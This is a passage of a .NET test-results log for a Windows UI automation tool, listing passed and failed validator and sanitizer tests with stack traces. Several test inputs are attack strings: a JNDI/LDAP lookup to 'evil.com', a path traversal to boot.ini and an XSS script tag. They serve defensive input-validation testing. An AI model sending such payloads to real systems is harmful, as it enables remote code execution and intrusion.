        <ErrorInfo>
          <Message>Expected result.ErrorMessage "Selector must be in format 'type=value'" to contain "Invalid selector format".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(String selector) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ElementSelectorValidatorTests.cs:line 86&#xD;
   at InvokeStub_ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="0566e7f6-28d1-4c5a-b7bd-afd99e6f7a11" testId="b1a8787f-ca1a-8d5e-b7aa-7c209fcca851" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithEmptyValues_ShouldReturnFailure(selector: &quot;name=&quot;)" computerName="MC-HR-128" duration="00:00:00.0029380" startTime="2025-11-01T16:15:12.7094302-04:00" endTime="2025-11-01T16:15:12.7095756-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="0566e7f6-28d1-4c5a-b7bd-afd99e6f7a11">
      <Output>
        <ErrorInfo>
          <Message>Expected result.ErrorMessage "Selector must be in format 'type=value'" to contain "Selector value cannot be empty".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithEmptyValues_ShouldReturnFailure(String selector) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ElementSelectorValidatorTests.cs:line 72&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="497be096-263d-4937-b6e2-e774977d78ce" testId="2705d4b6-0754-c72c-dfb9-79439366c5d6" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.RemovePathTraversal_WithPathTraversal_ShouldSanitize(pathTraversalInput: &quot;./../../boot.ini&quot;)" computerName="MC-HR-128" duration="00:00:00.0000242" startTime="2025-11-01T16:15:12.0095179-04:00" endTime="2025-11-01T16:15:12.0096906-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="497be096-263d-4937-b6e2-e774977d78ce" />
    <UnitTestResult executionId="cd8cbdc7-1a6c-4f7a-b128-529d06414434" testId="84af3f6a-d861-651f-e893-1fb41d70a643" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithInjectionAttempts_PreservesContent(injectionInput: &quot;${jndi:ldap://evil.com}&quot;)" computerName="MC-HR-128" duration="00:00:00.0001607" startTime="2025-11-01T16:15:11.9809866-04:00" endTime="2025-11-01T16:15:11.9810965-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cd8cbdc7-1a6c-4f7a-b128-529d06414434" />
    <UnitTestResult executionId="ed05875c-1506-42bc-9649-bce3cd85ca81" testId="7d14aa25-f89f-a34d-7225-e97434a1a8b0" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(selector: &quot;id=TestButton&quot;)" computerName="MC-HR-128" duration="00:00:00.0000296" startTime="2025-11-01T16:15:12.8564017-04:00" endTime="2025-11-01T16:15:12.8564966-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ed05875c-1506-42bc-9649-bce3cd85ca81" />
    <UnitTestResult executionId="a696073f-b131-4928-b053-a067c378209d" testId="e28ce665-3480-7630-64b1-7c9900e5bfa4" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByWindowTitleAsync_WithVariousTitles_ShouldHandleGracefully(windowTitle: &quot;Notepad&quot;)" computerName="MC-HR-128" duration="00:00:01.0611619" startTime="2025-11-01T16:15:20.3927494-04:00" endTime="2025-11-01T16:15:21.4543430-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a696073f-b131-4928-b053-a067c378209d" />
    <UnitTestResult executionId="cb6feb8c-d625-42ff-97f9-9a8fba20d24a" testId="ac3b5d6c-c230-eb33-b75f-04ee5bc0fbf4" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.TypeTextAsync_WithEmptyText_ShouldReturnFalse" computerName="MC-HR-128" duration="00:00:00.0219117" startTime="2025-11-01T16:15:17.1113452-04:00" endTime="2025-11-01T16:15:17.1371861-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cb6feb8c-d625-42ff-97f9-9a8fba20d24a">
      <Output>
        <ErrorInfo>
          <Message>System.ArgumentException : Can not instantiate proxy of class: FlaUI.Core.AutomationElements.AutomationElement.&#xD;
Could not find a parameterless constructor. (Parameter 'constructorArguments')&#xD;
---- System.MissingMethodException : Constructor on type 'Castle.Proxies.AutomationElementProxy' not found.</Message>
          <StackTrace>   at Castle.DynamicProxy.ProxyGenerator.CreateClassProxyInstance(Type proxyType, List`1 proxyArguments, Type classToProxy, Object[] constructorArguments)&#xD;
   at Castle.DynamicProxy.ProxyGenerator.CreateClassProxy(Type classToProxy, Type[] additionalInterfacesToProxy, ProxyGenerationOptions options, Object[] constructorArguments, IInterceptor[] interceptors)&#xD;
   at Moq.CastleProxyFactory.CreateProxy(Type mockType, IInterceptor interceptor, Type[] interfaces, Object[] arguments) in /_/src/Moq/Interception/CastleProxyFactory.cs:line 62&#xD;
   at Moq.Mock`1.InitializeInstance() in /_/src/Moq/Mock`1.cs:line 309&#xD;
   at Moq.Mock`1.OnGetObject() in /_/src/Moq/Mock`1.cs:line 323&#xD;
   at Moq.Mock.get_Object() in /_/src/Moq/Mock.cs:line 181&#xD;
   at Moq.Mock`1.get_Object() in /_/src/Moq/Mock`1.cs:line 281&#xD;
   at CLIF.Tests.Unit.Services.AutomationServiceTests.TypeTextAsync_WithEmptyText_ShouldReturnFalse() in c:\Users\Chris\clif\CLIF.Tests\Unit\Services\AutomationServiceTests.cs:line 164&#xD;
--- End of stack trace from previous location ---&#xD;
----- Inner Stack Trace -----&#xD;
   at System.RuntimeType.CreateInstanceImpl(BindingFlags bindingAttr, Binder binder, Object[] args, CultureInfo culture)&#xD;
   at Castle.DynamicProxy.ProxyGenerator.CreateClassProxyInstance(Type proxyType, List`1 proxyArguments, Type classToProxy, Object[] constructorArguments)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="60918d14-85ce-4bbd-97f9-08bb7fa7d42c" testId="3963690d-248f-74c9-1605-a41866361818" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.TakeScreenshotAsync_ShouldNotThrow" computerName="MC-HR-128" duration="00:00:00.0079734" startTime="2025-11-01T16:15:17.0863880-04:00" endTime="2025-11-01T16:15:17.0934430-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="60918d14-85ce-4bbd-97f9-08bb7fa7d42c" />
    <UnitTestResult executionId="cfe44304-f4a6-42ec-bda8-7d52f2523e73" testId="95f05dd8-8842-3da6-1c53-6f426a6d73aa" testName="CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(restrictedPath: &quot;C:\\Program Files\\&quot;)" computerName="MC-HR-128" duration="00:00:00.0104844" startTime="2025-11-01T16:15:12.6423010-04:00" endTime="2025-11-01T16:15:12.6424252-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cfe44304-f4a6-42ec-bda8-7d52f2523e73">
      <Output>
        <ErrorInfo>
          <Message>Expected result.ErrorMessage "Input contains invalid character: ':'" to contain "restricted system directory".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(String restrictedPath) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\FilePathValidatorTests.cs:line 71&#xD;
   at InvokeStub_FilePathValidatorTests.Validate_WithRestrictedSystemPaths_ShouldReturnFailure(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="83077425-43c4-4f51-9d69-a66dff595ff9" testId="4af94cd7-9789-d2ce-4d00-02f1436d51bb" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithMaliciousContentInMiddle_PreservesContent(mixedInput: &quot;test&lt;script&gt;alert('xss')&lt;/script&gt;end&quot;)" computerName="MC-HR-128" duration="00:00:00.0002482" startTime="2025-11-01T16:15:12.0067926-04:00" endTime="2025-11-01T16:15:12.0069148-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="83077425-43c4-4f51-9d69-a66dff595ff9" />
    <UnitTestResult executionId="62e09dd1-38c0-4047-9183-1d1c46ccc84e" testId="d49bb175-64af-db14-3b4d-8adf8d29f54b" testName="CLIF.Tests.InfrastructureTests.ValidationFramework_ShouldBeAccessible" computerName="MC-HR-128" duration="00:00:00.0003255" startTime="2025-11-01T16:15:12.7324111-04:00" endTime="2025-11-01T16:15:12.7325219-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="62e09dd1-38c0-4047-9183-1d1c46ccc84e" />
    <UnitTestResult executionId="cd3216f4-e8f9-4d90-8dac-a44386d53597" testId="4a60dda3-e52b-ab9e-1f31-385fbe63715c" testName="CLIF.Tests.Unit.Commands.TreeCommandTests.Command_ShouldHaveFilteringOptions" computerName="MC-HR-128" duration="00:00:00.0026757" startTime="2025-11-01T16:15:12.1045872-04:00" endTime="2025-11-01T16:15:12.1073464-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cd3216f4-e8f9-4d90-8dac-a44386d53597" />
    <UnitTestResult executionId="a9df7865-5fda-402b-b639-69e38f94e085" testId="bd22b512-14d8-c5c2-3873-0afe28d94ebd" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithWhitespaceOnly_ShouldPreserveWhitespace(whitespaceInput: &quot;\t\r\n&quot;)" computerName="MC-HR-128" duration="00:00:00.0060518" startTime="2025-11-01T16:15:11.9597115-04:00" endTime="2025-11-01T16:15:11.9782223-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a9df7865-5fda-402b-b639-69e38f94e085" />
    <UnitTestResult executionId="c0a3d6f7-b864-40ce-9dff-c3ddd79062ba" testId="b999e7d2-3170-44b7-d4bf-ec3058c0e05a" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.ClickAsync_WithNullElement_ShouldReturnFalse" computerName="MC-HR-128" duration="00:00:00.0094425" startTime="2025-11-01T16:15:17.1559234-04:00" endTime="2025-11-01T16:15:17.1657423-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c0a3d6f7-b864-40ce-9dff-c3ddd79062ba" />
    <UnitTestResult executionId="759a351f-d9d7-43d7-8a72-3f3afcfecbbb" testId="47d469c0-c00d-7964-91ef-31c1afd6235f" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.IsSessionActive_Initially_ShouldBeFalse" computerName="MC-HR-128" duration="00:00:00.0009962" startTime="2025-11-01T16:15:12.8364183-04:00" endTime="2025-11-01T16:15:12.8372149-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="759a351f-d9d7-43d7-8a72-3f3afcfecbbb" />
    <UnitTestResult executionId="544aad71-e267-4a00-bc8c-f1c3695328bc" testId="148d3d60-028b-2802-22a9-aae56ed6a787" testName="CLIF.Tests.Integration.ValidationHarnessTests.TextInputValidator_WithValidText_ShouldPass(text: &quot;Special chars: !@#$%&quot;)" computerName="MC-HR-128" duration="00:00:00.0000174" startTime="2025-11-01T16:15:12.8540654-04:00" endTime="2025-11-01T16:15:12.8541607-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="544aad71-e267-4a00-bc8c-f1c3695328bc" />
    <UnitTestResult executionId="c89df901-a019-48c6-af63-fefce89203ed" testId="0b1c2f60-1078-0543-2cb7-77ca335ccd2e" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: &quot;script.json&quot;)" computerName="MC-HR-128" duration="00:00:00.0014202" startTime="2025-11-01T16:15:12.8666487-04:00" endTime="2025-11-01T16:15:12.8671168-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c89df901-a019-48c6-af63-fefce89203ed">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(String path) in c:\Users\Chris\clif\CLIF.Tests\Integration\ValidationHarnessTests.cs:line 98&#xD;
   at InvokeStub_ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="1eb7ea5d-9d0c-4369-a423-f97eda75860e" testId="a3f4cb16-2dde-5ad7-978a-e7c4b3b82903" testName="CLIF.Tests.Unit.Security.SecurityContextTests.ValidateFileAccess_WithRestrictedPaths_ShouldHandleGracefully(restrictedPath: &quot;C:\\Windows\\System32\\drivers&quot;)" computerName="MC-HR-128" duration="00:00:00.0006726" startTime="2025-11-01T16:15:11.9850354-04:00" endTime="2025-11-01T16:15:11.9933342-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="1eb7ea5d-9d0c-4369-a423-f97eda75860e" />
    <UnitTestResult executionId="35c819d8-6526-4e85-a322-ae877097c009" testId="d6de2193-439d-2732-ef16-6a8c9af2556d" testName="CLIF.Tests.InfrastructureTests.ValidationResult_ShouldSupportBothSuccessAndFailure" computerName="MC-HR-128" duration="00:00:00.0005330" startTime="2025-11-01T16:15:12.7319455-04:00" endTime="2025-11-01T16:15:12.7321027-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="35c819d8-6526-4e85-a322-ae877097c009" />
    <UnitTestResult executionId="04aa6971-1b81-4a4b-92e0-cf07c51181d5" testId="6c48226f-4a5c-9fcc-edb9-5e560b056d4c" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithIncompleteCommands_ShouldReturnFalse(command: &quot;type id=Test&quot;)" computerName="MC-HR-128" duration="00:00:00.0020451" startTime="2025-11-01T16:15:12.8330466-04:00" endTime="2025-11-01T16:15:12.8339247-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="04aa6971-1b81-4a4b-92e0-cf07c51181d5" />
    <UnitTestResult executionId="ca246d08-c1b9-4314-bf4d-f51d48450fa7" testId="fca25cd9-4776-80d3-e118-3bef722f470a" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.GetValueAsync_WithNullElement_ShouldReturnEmptyString" computerName="MC-HR-128" duration="00:00:00.0043698" startTime="2025-11-01T16:15:17.1507967-04:00" endTime="2025-11-01T16:15:17.1555864-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ca246d08-c1b9-4314-bf4d-f51d48450fa7" />
    <UnitTestResult executionId="73e13cb3-b843-49d8-a368-81447ade2bed" testId="398cc48d-00c6-534d-c654-94c22e36bfb1" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithNullSelector_ShouldReturnFailure" computerName="MC-HR-128" duration="00:00:00.0016328" startTime="2025-11-01T16:15:12.7231933-04:00" endTime="2025-11-01T16:15:12.7272674-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="73e13cb3-b843-49d8-a368-81447ade2bed">
      <Output>
        <ErrorInfo>
          <Message>Expected result.ErrorMessage "Element selector cannot be empty" to contain "Element selector cannot be null".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithNullSelector_ShouldReturnFailure() in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ElementSelectorValidatorTests.cs:line 97&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithNoArgs(Object obj, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="059c295a-46aa-48f0-9d17-7ac896a2b263" testId="ad90125f-8256-f666-4161-a253fc175637" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.ProcessService_ConcurrentCalls_ShouldHandleGracefully" computerName="MC-HR-128" duration="00:00:01.6195276" startTime="2025-11-01T16:15:15.7314486-04:00" endTime="2025-11-01T16:15:17.3510931-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="059c295a-46aa-48f0-9d17-7ac896a2b263" />
    <UnitTestResult executionId="ce80811b-3461-4360-9b05-0fa7e6510998" testId="6ec3c45b-5020-aa6e-5056-553100118bd4" testName="CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePath_ShouldReturnSuccess" computerName="MC-HR-128" duration="00:00:00.0166662" startTime="2025-11-01T16:15:12.6489739-04:00" endTime="2025-11-01T16:15:12.6495778-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ce80811b-3461-4360-9b05-0fa7e6510998">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePath_ShouldReturnSuccess() in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\FilePathValidatorTests.cs:line 27&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithNoArgs(Object obj, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="f94b1a38-a3e6-46a0-b7a0-7825b53bce6a" testId="f086c805-5753-75fb-2cd7-f20c9ed7690f" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.AttachToProcessAsync_WithInvalidProcessId_ShouldReturnFalse" computerName="MC-HR-128" duration="00:00:00.0034936" startTime="2025-11-01T16:15:17.1675774-04:00" endTime="2025-11-01T16:15:17.1700118-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="f94b1a38-a3e6-46a0-b7a0-7825b53bce6a" />
    <UnitTestResult executionId="4060890b-b870-4255-8dd2-232f9035916b" testId="499a4868-75ac-0bcf-fb75-864ccbc68601" testName="CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(maliciousText: &quot;${jndi:ldap://evil.com}&quot;)" computerName="MC-HR-128" duration="00:00:00.0016558" startTime="2025-11-01T16:15:12.5918479-04:00" endTime="2025-11-01T16:15:12.5919635-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="4060890b-b870-4255-8dd2-232f9035916b">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be False, but found True.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeFalse(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(String maliciousText) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\TextInputValidatorTests.cs:line 54&#xD;
   at InvokeStub_TextInputValidatorTests.Validate_WithMaliciousText_ShouldReturnFailure(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="0b6805f0-d2e3-4e28-9cc4-46b0e9c54d24" testId="1805cad0-aa14-97b4-39ec-651436add4a0" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.IsProcessAliveAsync_WithCurrentProcess_ShouldReturnTrue" computerName="MC-HR-128" duration="00:00:00.0020287" startTime="2025-11-01T16:15:26.4802388-04:00" endTime="2025-11-01T16:15:26.4824965-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="0b6805f0-d2e3-4e28-9cc4-46b0e9c54d24" />
    <UnitTestResult executionId="2d953e2f-cc9e-4027-aadd-549a8a61152a" testId="bcabe9af-fe01-bf05-1eeb-90d4145ab937" testName="CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextBelowMinimumLength_ShouldReturnFailure(shortText: &quot;abc&quot;)" computerName="MC-HR-128" duration="00:00:00.0017777" startTime="2025-11-01T16:15:12.5825761-04:00" endTime="2025-11-01T16:15:12.5827649-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2d953e2f-cc9e-4027-aadd-549a8a61152a">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be False, but found True.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeFalse(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextBelowMinimumLength_ShouldReturnFailure(String shortText) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\TextInputValidatorTests.cs:line 68&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
